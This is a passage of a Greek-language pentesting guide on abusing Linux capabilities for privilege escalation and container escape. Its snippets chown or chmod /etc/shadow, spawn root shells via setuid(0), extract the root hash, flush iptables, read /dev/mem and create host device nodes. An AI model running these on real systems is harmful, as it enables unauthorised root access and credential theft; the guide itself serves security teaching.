**Αυτή η capability επιτρέπει σε μια διεργασία να αλλάζει τον ιδιοκτήτη αρχείων**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Ας υποθέσουμε ότι το **`python`** binary έχει αυτή την capability· μπορείς να αλλάξεις τον ιδιοκτήτη ενός αρχείου, όπως το **`shadow`**, και στη συνέχεια να αξιοποιήσεις την πρόσβαση που αποκτάς για να το τροποποιήσεις, εφόσον το επιτρέπουν τα υπόλοιπα δικαιώματα:

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

Ή όταν το δυαδικό αρχείο **`ruby`** έχει αυτή τη δυνατότητα:

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP_FOWNER

**Αυτή η capability παρακάμπτει τους ελέγχους ιδιοκτησίας για πολλές λειτουργίες αρχείων, συμπεριλαμβανομένης της αλλαγής δικαιωμάτων**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Αν το python έχει αυτήν την capability, μπορείς να τροποποιήσεις τα δικαιώματα του αρχείου shadow, **να αλλάξεις τον κωδικό πρόσβασης του root** και να κλιμακώσεις τα προνόμιά σου:

```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```

### CAP_SETUID

**Αυτή η δυνατότητα επιτρέπει σε μια διεργασία να αλλάξει το effective user ID της, σύμφωνα με τους κανόνες διαπιστευτηρίων και δυνατοτήτων που επιβάλλει ο kernel**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Αν το python έχει αυτήν τη **δυνατότητα**, μπορείς να την εκμεταλλευτείς πολύ εύκολα για να κλιμακώσεις τα προνόμια σε root:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Ένας άλλος τρόπος:**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

Για ένα **custom** εκτελέσιμο με effective `CAP_SETUID`, επιθεωρήστε τη reachable διαδρομή κώδικα αντί να υποθέτετε ότι το capability από μόνο του παρέχει shell. Κείμενο ελεγχόμενο από τον caller, όταν περνά ως *format string* στη [`printf`](https://man7.org/linux/man-pages/man3/printf.3.html), μπορεί να αποκαλύψει ή να τροποποιήσει τη μνήμη της διεργασίας· μια χρήσιμη μετάβαση προνομίων εξακολουθεί να εξαρτάται από μια ευάλωτη κλήση, ελεγχόμενη είσοδο και μια μεταγενέστερη ενέργεια μετά το `setuid(0)`. Αν αυτή η ενέργεια εκκινεί εξωτερικό helper με βάση το όνομά του, επαληθεύστε την effective ταυτότητα κατά την εκκίνησή του, το πραγματικό `PATH` και αν κάποιος κατάλογος που αναζητείται νωρίτερα είναι εγγράψιμος και προσπελάσιμος από τον caller. Ένα ανενεργό file capability, το `no_new_privs`, μια σταθερή έμπιστη διαδρομή προς το helper ή ένας μη προσπελάσιμος κλάδος αλλάζει το αποτέλεσμα. Εξετάστε το binary ή τον διαθέσιμο πηγαίο κώδικα offline· μην εκτελείτε ύποπτο privileged helper κατά τη συνήθη απαρίθμηση.

## CAP_SETGID

**Αυτό το capability επιτρέπει σε μια διεργασία να αλλάξει το effective group ID της, με την επιφύλαξη των κανόνων διαπιστευτηρίων και capabilities που επιβάλλει ο kernel**.<sup>[[14]](#references)</sup>

Υπάρχουν πολλά αρχεία που μπορείτε να **αντικαταστήσετε για να κλιμακώσετε τα προνόμια,** [**μπορείτε να βρείτε ιδέες εδώ**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Παράδειγμα με binary**

Σε αυτή την περίπτωση, αναζητήστε ενδιαφέροντα αρχεία που μπορεί να διαβάσει μια ομάδα, καθώς μπορείτε να υποδυθείτε οποιαδήποτε ομάδα:

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Αφού εντοπίσετε ένα αρχείο που μπορείτε να εκμεταλλευτείτε (διαβάζοντας ή γράφοντας) για να κλιμακώσετε τα προνόμια, μπορείτε να **αποκτήσετε ένα shell προσποιούμενοι ότι ανήκετε στην ενδιαφέρουσα ομάδα** με:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

Σε αυτή την περίπτωση έγινε impersonation της ομάδας shadow, ώστε να μπορείτε να διαβάσετε το αρχείο `/etc/shadow`:

```bash
cat /etc/shadow
```

### Συνδυασμένη αλυσίδα: CAP_SETGID + CAP_CHOWN

Όταν και τα δύο capabilities είναι διαθέσιμα στο ίδιο helper, μια πρακτική αλυσίδα είναι:

1. Άλλαξε το EGID σε `shadow` (ή σε άλλη προνομιούχα ομάδα).
2. Χρησιμοποίησε το `chown` στο `/etc/shadow` για να ορίσεις το UID σου, διατηρώντας την ομάδα `shadow`.
3. Διάβασε ένα hash-στόχο και κάνε crack/pivot.

```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```

Αυτό αποφεύγει την ανάγκη για άμεση πρόσβαση ως root και συνήθως αρκεί για να κάνετε pivot μέσω επαναχρησιμοποίησης διαπιστευτηρίων.

Αν είναι εγκατεστημένο το **docker**, θα μπορούσατε να κάνετε **impersonate** την ομάδα **docker** και να την καταχραστείτε για να επικοινωνήσετε με το [**docker socket** και να κλιμακώσετε τα προνόμια](#writable-docker-socket).

## CAP_SETFCAP

**Αυτή η δυνατότητα επιτρέπει σε μια διεργασία να ορίζει capabilities αρχείων**.<sup>[[14]](#references)</sup>

**Παράδειγμα με δυαδικό αρχείο**

Αν το python έχει αυτήν τη **δυνατότητα**, μπορείτε πολύ εύκολα να την καταχραστείτε για να κλιμακώσετε τα προνόμια σε root:

```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```

> [!WARNING]
> Ένα νέο σύνολο file capabilities αντικαθιστά το προηγούμενο· αν στη συνέχεια εκτελεστεί το βοηθητικό πρόγραμμα μόνο με τις νέες capabilities, ενδέχεται να μην διατηρεί πλέον την `CAP_SETFCAP` για να ενημερώσει ένα άλλο αρχείο.<sup>[[14]](#references)[[25]](#references)</sup>

Μόλις αποκτήσετε [SETUID capability](linux-capabilities.md#cap_setuid), μπορείτε να μεταβείτε στην ενότητά της για να δείτε πώς να κλιμακώσετε τα προνόμιά σας.

**Παράδειγμα με περιβάλλον (Docker breakout)**

Το τεκμηριωμένο προεπιλεγμένο σύνολο capabilities του Docker περιλαμβάνει την **CAP_SETFCAP**, αλλά το πραγματικό σύνολο εξαρτάται από τη διαμόρφωση του runtime.<sup>[[19]](#references)</sup>
Μπορείτε να επιθεωρήσετε τις capabilities της διεργασίας με:

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

Αυτή η capability επιτρέπει την εγγραφή δυνατοτήτων αρχείου, αλλά από μόνη της δεν εκχωρεί αυτές τις δυνατότητες στην τρέχουσα διεργασία ούτε παρακάμπτει τους κανόνες αρχείου, bounding-set και namespace που εφαρμόζονται κατά την εκτέλεση του αρχείου.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

Οι capabilities που επιτρέπονται για το αρχείο περιορίζονται από το capability bounding set της διεργασίας, ενώ το effective bit του αρχείου καθορίζει αν το permitted set του αρχείου προστίθεται στο effective set της διεργασίας. Γι’ αυτό, η προσθήκη capabilities σε ένα αρχείο δεν σημαίνει ότι κάθε ζητούμενη capability μπορεί να χρησιμοποιηθεί αυτόματα κατά την εκτέλεση.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

Το [**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) παρέχει πρόσβαση σε διάφορες ευαίσθητες λειτουργίες, όπως πρόσβαση στα `/dev/mem`, `/dev/kmem` ή `/proc/kcore`, τροποποίηση του `mmap_min_addr`, πρόσβαση στις system calls `ioperm(2)` και `iopl(2)`, καθώς και διάφορες εντολές δίσκου. Το `FIBMAP ioctl(2)` είναι επίσης ενεργοποιημένο μέσω αυτής της capability, κάτι που έχει προκαλέσει προβλήματα στο [παρελθόν](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Σύμφωνα με τη man page, επιτρέπει επίσης στον κάτοχό της να εκτελεί μια σειρά από λειτουργίες ειδικές για κάθε συσκευή σε άλλες συσκευές.<sup>[[14]](#references)</sup>

Αυτό μπορεί να είναι χρήσιμο για **privilege escalation** και **Docker breakout**.<sup>[[14]](#references)</sup>

Η capability από μόνη της δεν εκθέτει κάποια χρήσιμη διεπαφή. Για να γίνει breakout από container απαιτούνται επιπλέον μια προσβάσιμη συσκευή ή ένας πόρος του host, τα κατάλληλα δικαιώματα device-cgroup και filesystem, καθώς και μια τεχνική ειδική για το hardware και τον kernel. Οι αυστηροί περιορισμοί στα `/dev/mem`, το kernel lockdown, η virtualization, το seccomp και οι πολιτικές LSM συνήθως καταργούν τις γενικές διαδρομές. Επαληθεύστε πρώτα την capability και την έκθεσή της:

```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

Αν το `/dev/mem` είναι η εγκεκριμένη διεπαφή, ένα αναλώσιμο lab μπορεί να επιδείξει διαρροή μνήμης κόμβου μεταξύ ορίων, διαβάζοντας και κατακερματίζοντας ένα εύρος που επιλέγεται από τον χάρτη υλικού του lab:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Μην μαντεύετε το εύρος: η ανάγνωση ορισμένων περιοχών MMIO μπορεί να έχει παρενέργειες, ενώ μια έγκυρη διεύθυνση σε μία πλατφόρμα μπορεί να ελέγχει υλικό ή μνήμη πυρήνα σε κάποια άλλη. Η τροποποίηση μνήμης πυρήνα ή ο έλεγχος συσκευών απαιτεί εγκεκριμένη, ειδική για την πλατφόρμα απόδειξη· δεν υπάρχει ασφαλές, καθολικό παράδειγμα απευθείας εγγραφής.

## CAP_KILL

**Αυτή η δυνατότητα παρακάμπτει τους ελέγχους δικαιωμάτων για την αποστολή σημάτων σε διεργασίες, στις περιπτώσεις που ορίζει ο πυρήνας**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Ας υποθέσουμε ότι το binary **`python`** έχει αυτή τη δυνατότητα. Αν μπορούσατε **επίσης να τροποποιήσετε κάποιο αρχείο διαμόρφωσης υπηρεσίας ή socket** (ή οποιοδήποτε αρχείο διαμόρφωσης σχετίζεται με μια υπηρεσία), θα μπορούσατε να προσθέσετε ένα backdoor και μετά να τερματίσετε τη διεργασία που σχετίζεται με την υπηρεσία και να περιμένετε να εκτελεστεί το νέο αρχείο διαμόρφωσης με το backdoor σας.

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**Privesc με kill**

Αν έχετε capabilities για kill και υπάρχει ένα **node program που εκτελείται ως root** (ή ως διαφορετικός χρήστης), πιθανότατα μπορείτε να του **στείλετε** το **σήμα SIGUSR1** και να το κάνετε να **ανοίξει το node debugger**, ώστε να συνδεθείτε.

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```


{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Αυτή η δυνατότητα επιτρέπει τη δέσμευση σε θύρες Internet κάτω από την 1024.** Δεν παρέχει άμεσα ευρύτερα δικαιώματα privilege escalation.<sup>[[14]](#references)</sup>

**Παράδειγμα με δυαδικό αρχείο**

Αν το **`python`** έχει αυτή τη δυνατότητα, θα μπορεί να ακούει σε οποιαδήποτε θύρα και ακόμη και να συνδέεται από αυτήν σε οποιαδήποτε άλλη θύρα (ορισμένες υπηρεσίες απαιτούν συνδέσεις από θύρες με συγκεκριμένα δικαιώματα)

{{#tabs}}
{{#tab name="Listen"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```

{{#endtab}}

{{#tab name="Connect"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```

{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

Το [**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει στις διεργασίες να **δημιουργούν RAW και PACKET sockets**, δίνοντάς τους τη δυνατότητα να δημιουργούν και να στέλνουν αυθαίρετα network packets. Αυτό μπορεί να προκαλέσει κινδύνους ασφαλείας σε περιβάλλοντα με containers, όπως πλαστογράφηση packets, εισαγωγή traffic και παράκαμψη των ελέγχων πρόσβασης στο δίκτυο. Κακόβουλοι χρήστες θα μπορούσαν να το εκμεταλλευτούν για να επηρεάσουν τη δρομολόγηση των containers ή να θέσουν σε κίνδυνο την ασφάλεια του δικτύου του host, ιδίως αν δεν υπάρχουν επαρκείς προστασίες firewall. Επιπλέον, το **CAP_NET_RAW** υποστηρίζει λειτουργίες όπως το ping μέσω αιτημάτων RAW ICMP.<sup>[[14]](#references)</sup>

**Αυτό μπορεί να επιτρέψει την καταγραφή packets με κατάλληλο socket interface.** Δεν παρέχει άμεσα ευρύτερη κλιμάκωση προνομίων.<sup>[[14]](#references)</sup>

Για μια διαδρομή έκθεσης διαπιστευτηρίων, επιβεβαιώστε επίσης ότι ο τρέχων λογαριασμός μπορεί να εκτελέσει ένα εργαλείο καταγραφής με effective capabilities, ότι το σχετικό traffic διέρχεται από interface ορατό στο network namespace του και ότι τα δεδομένα ελέγχου ταυτότητας μεταδίδονται σε plaintext. Για παράδειγμα, διαπιστευτήρια HTTP Basic μέσω μη κρυπτογραφημένου HTTP μπορούν να παρατηρηθούν στο loopback, αν το εργαλείο καταγραφής έχει πρόσβαση σε αυτό το interface. Η μετάβαση σε άλλο λογαριασμό απαιτεί επιπλέον τα διαπιστευτήρια που καταγράφηκαν να είναι έγκυρα για άλλη ταυτότητα· ένα file capability ή ένα ορατό αίτημα σύνδεσης από μόνο του δεν αποδεικνύει επαναχρησιμοποίηση κωδικού πρόσβασης.

Σε ασύρματο host, ένα εκτελέσιμο εργαλείο ελέγχου WPS, όπως το `reaver`, με effective `CAP_NET_RAW`, καθώς και ένα AP και ένα interface σε monitor-mode ορατά μέσω του `iw dev`, αποτελούν επιπλέον ενδείξεις προς διερεύνηση. **Δεν** αποδεικνύουν ότι είναι δυνατή η κλιμάκωση προνομίων: το AP πρέπει να επιτρέπει έλεγχο ταυτότητας WPS PIN χωρίς αποτελεσματικό κλείδωμα, να είναι προσβάσιμο από το ασύρματο interface και να αποκαλύπτει PSK· τα προνόμια του host αλλάζουν μόνο αν αυτό το PSK χρησιμοποιείται ξανά για κάποιον λογαριασμό. Η παθητική απαρίθμηση πρέπει να αναφέρει τις λειτουργίες και τις δυνατότητες των interfaces, όχι να εκπέμπει probes ή να δοκιμάζει PIN. Δείτε το [CERT/CC VU#723755](https://www.kb.cert.org/vuls/id/723755) για την αδυναμία του WPS PIN και την [τεκμηρίωση του έργου Reaver](https://github.com/shift/reaver-wps) για τη συμπεριφορά του εργαλείου.

**Παράδειγμα με binary**

Αν το binary **`tcpdump`** έχει αυτήν τη δυνατότητα, θα μπορείτε να το χρησιμοποιήσετε για να καταγράψετε πληροφορίες δικτύου.

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

Αν το **περιβάλλον** παρέχει αυτήν τη δυνατότητα, το **`tcpdump`** μπορεί επίσης να τη χρησιμοποιήσει για να κάνει sniff της κίνησης.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary 2**

Το ακόλουθο παράδειγμα είναι κώδικας **`python2`**, ο οποίος μπορεί να είναι χρήσιμος για την αναχαίτιση της κίνησης στη διεπαφή "**lo**" (**localhost**). Ο κώδικας προέρχεται από το lab "_The Basics: CAP-NET_BIND + NET_RAW_" στο [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```

## CAP_NET_ADMIN + CAP_NET_RAW

Το [**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) παρέχει στον κάτοχό του τη δυνατότητα να **τροποποιεί τις ρυθμίσεις δικτύου**, όπως τις ρυθμίσεις του firewall, τους πίνακες δρομολόγησης, τα δικαιώματα των socket και τις ρυθμίσεις των διεπαφών δικτύου στο τρέχον network namespace. Μπορεί επίσης να ενεργοποιήσει τη promiscuous mode σε μια διεπαφή αυτού του namespace· αυτό ενδέχεται να εκθέσει την κίνηση που παραδίδεται στη συγκεκριμένη διεπαφή, αλλά από μόνο του δεν επιτρέπει την υποκλοπή κίνησης από αυθαίρετες διεπαφές σε άλλα network namespaces.<sup>[[14]](#references)</sup>

Αυτές οι λειτουργίες επηρεάζουν το **τρέχον network namespace** της διεργασίας. Για τον έλεγχο της κατάστασης δικτύου του host απαιτείται `--network=host`, `hostNetwork: true` στο Kubernetes ή ένας ξεχωριστός μηχανισμός εισόδου σε namespace. Το `CAP_NET_RAW` από μόνο του δεν παρέχει γενική πρόσβαση σε shell του host, αλλά έχει συμμετάσχει σε μια τεκμηριωμένη διαφυγή συγκεκριμένου πρωτοκόλλου: μια παλαιότερη αλυσίδα στο GCE συνδύαζε root, το network namespace του host, `CAP_NET_ADMIN`, `CAP_NET_RAW`, κίνηση metadata σε plaintext και ένα αίτημα προς τον guest agent που μπορούσε να αποτελέσει αντικείμενο race condition, για την εισαγωγή ενός SSH key. Δείτε το [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) για όλες τις προϋποθέσεις και τις σύγχρονες επιφυλάξεις σχετικά με τα HTTPS metadata.

**Παράδειγμα με binary**

Ας υποθέσουμε ότι το **python binary** έχει αυτές τις capabilities.

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP_LINUX_IMMUTABLE

**Αυτή η capability επιτρέπει την τροποποίηση σημαιών inode, όπως immutable και append-only.** Δεν παρέχει άμεσα ευρύτερα προνόμια για escalation.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Αν διαπιστώσετε ότι ένα αρχείο είναι immutable και το python έχει αυτή την capability, μπορείτε να **αφαιρέσετε το immutable attribute και να κάνετε το αρχείο τροποποιήσιμο:**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
    f.write('New content for the file\n')
```

Οι λειτουργίες `FS_IOC_GETFLAGS` και `FS_IOC_SETFLAGS` διαβάζουν και ενημερώνουν τις σημαίες inode· το `FS_IMMUTABLE_FL` είναι η σημαία immutable που απενεργοποιείται σε αυτό το παράδειγμα.<sup>[[27]](#references)</sup>

> [!TIP]
> Σημειώστε ότι συνήθως αυτό το χαρακτηριστικό immutable ορίζεται και αφαιρείται με τις εξής εντολές:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει την εκτέλεση της κλήσης συστήματος `chroot(2)`, η οποία μπορεί να επιτρέψει τη διαφυγή από ένα ασθενώς δομημένο `chroot(2)` jail μέσω γνωστών τεχνικών.<sup>[[11]](#references)[[14]](#references)</sup>

Αυτή είναι **δυνατότητα διαφυγής από chroot jail, όχι αυτόνομη δυνατότητα διαφυγής από container προς host**. Δεν εκθέτει το filesystem του host ούτε παρακάμπτει τα δικαιώματά του. Αν το root του host είναι ήδη προσαρτημένο ή προσβάσιμο μέσω του `/proc/<pid>/root`, η `chroot()` απλώς ορίζει αυτό το υπάρχον δέντρο ως τη ρίζα διαδρομών της διεργασίας. Ξεχωριστά, η αλλαγή των mount namespaces με `setns(2)` απαιτεί τόσο `CAP_SYS_CHROOT` όσο και `CAP_SYS_ADMIN` στο user namespace του καλούντος, καθώς και `CAP_SYS_ADMIN` στο user namespace που κατέχει το στοχευόμενο mount namespace.<sup>[[14]](#references)</sup>

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

Η [**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει την εκτέλεση της κλήσης συστήματος `reboot(2)` για επανεκκινήσεις του συστήματος, συμπεριλαμβανομένων εντολών όπως η `LINUX_REBOOT_CMD_RESTART2`· επιτρέπει επίσης τις `kexec_load(2)` και, από το Linux 3.17 και μετά, την `kexec_file_load(2)` για τη φόρτωση νέων πυρήνων ή υπογεγραμμένων πυρήνων ανάκαμψης από κατάρρευση, αντίστοιχα.<sup>[[14]](#references)</sup>

Μέσα σε ένα ιδιωτικό PID namespace, ένα υποστηριζόμενο αίτημα `reboot()` τερματίζει τη διεργασία init αυτού του namespace αντί να επανεκκινεί το host. Επομένως, για να επηρεαστεί η επανεκκίνηση του host απαιτείται το αρχικό PID namespace, συνήθως μέσω κοινής χρήσης των PID του host. Μια κατάληψη μέσω kexec απαιτεί επιπλέον συμβατή εικόνα, διαθέσιμη κλήση συστήματος και επιτρεπτική πολιτική lockdown και υπογραφών. Μην ενεργοποιείτε καμία από τις δύο λειτουργίες σε κοινόχρηστο host μόνο και μόνο για να επαληθεύσετε τη δυνατότητα:

```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

## CAP_SYSLOG

Το [**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) διαχωρίστηκε από το ευρύτερο **CAP_SYS_ADMIN** στο Linux 2.6.37, παρέχοντας συγκεκριμένα τη δυνατότητα χρήσης της κλήσης `syslog(2)`. Αυτή η δυνατότητα επιτρέπει την προβολή διευθύνσεων πυρήνα μέσω του `/proc` και παρόμοιων διεπαφών, όταν η ρύθμιση `kptr_restrict` έχει τιμή 1, η οποία ελέγχει την έκθεση διευθύνσεων πυρήνα. Από το Linux 2.6.39, η προεπιλεγμένη τιμή του `kptr_restrict` είναι 0, που σημαίνει ότι οι διευθύνσεις πυρήνα εκτίθενται, αν και πολλές διανομές την ορίζουν σε 1 (απόκρυψη διευθύνσεων από όλους εκτός από το uid 0) ή σε 2 (πάντα απόκρυψη διευθύνσεων) για λόγους ασφαλείας.<sup>[[14]](#references)</sup>

Επιπλέον, το **CAP_SYSLOG** επιτρέπει την πρόσβαση στην έξοδο του `dmesg`, όταν το `dmesg_restrict` έχει τιμή 1. Παρά αυτές τις αλλαγές, το **CAP_SYS_ADMIN** διατηρεί τη δυνατότητα εκτέλεσης λειτουργιών `syslog`, λόγω ιστορικών προηγούμενων.<sup>[[14]](#references)</sup>

## CAP_MKNOD

Το [**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επεκτείνει τη λειτουργικότητα της κλήσης συστήματος `mknod` πέρα από τη δημιουργία κανονικών αρχείων, FIFO (επώνυμων σωλήνων) ή UNIX domain sockets. Επιτρέπει συγκεκριμένα τη δημιουργία ειδικών αρχείων, στα οποία περιλαμβάνονται:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Ειδικά αρχεία χαρακτήρων, δηλαδή συσκευές όπως τα τερματικά.
- **S_IFBLK**: Ειδικά αρχεία block, δηλαδή συσκευές όπως οι δίσκοι.

Αυτή η δυνατότητα είναι χρήσιμη για διεργασίες που χρειάζεται να δημιουργούν αρχεία συσκευών, συμπεριλαμβανομένων συσκευών χαρακτήρων ή block.<sup>[[14]](#references)</sup>

Περιλαμβάνεται στο τεκμηριωμένο προεπιλεγμένο σύνολο δυνατοτήτων του Docker· επαληθεύστε την πραγματική διαμόρφωση runtime αντί να θεωρείτε ότι κάθε deployment χρησιμοποιεί τις ίδιες προεπιλογές ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Για ένα container escape, το `CAP_MKNOD` μπορεί να δημιουργήσει έναν ελλείποντα handle προς μια πραγματική συσκευή του host, αλλά **δεν** δημιουργεί την υποκείμενη συσκευή και **δεν** παρακάμπτει το device cgroup. Η πλήρης αλυσίδα απαιτεί:

1. Αποτελεσματικό `CAP_MKNOD` στο αρχικό user namespace, επειδή η δημιουργία συσκευών δεν υπόκειται σε namespaces.
2. Τον σωστό τύπο block ή χαρακτήρα και τους σωστούς κύριους/δευτερεύοντες αριθμούς για μια πραγματική συσκευή του host.
3. Άδεια από το device cgroup για το άνοιγμα αυτής της συσκευής.
4. Έναν συμβατό reader που λαμβάνει υπόψη το filesystem ή `CAP_SYS_ADMIN` για την προσάρτηση ενός block filesystem.
5. Άδεια από το filesystem και το LSM για τη δημιουργία και χρήση του node.

Για μια block device εργαστηρίου ext-family με πραγματικούς κύριους/δευτερεύοντες αριθμούς `252:1`, ένας έλεγχος μόνο για ανάγνωση είναι:

```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Αντικαταστήστε τους αριθμούς με αυτούς που εμφανίζονται στο `/sys/class/block/<device>/dev`. Αν η δημιουργία του node πετύχει, αλλά το άνοιγμά του επιστρέψει `Operation not permitted`, το device cgroup εξακολουθεί να αποκλείει την πρόσβαση. Αυτό είναι το αναμενόμενο αποτέλεσμα σε ένα container που έχει μόνο το προεπιλεγμένο `CAP_MKNOD` του Docker, χωρίς ρητή άδεια για τη συσκευή.

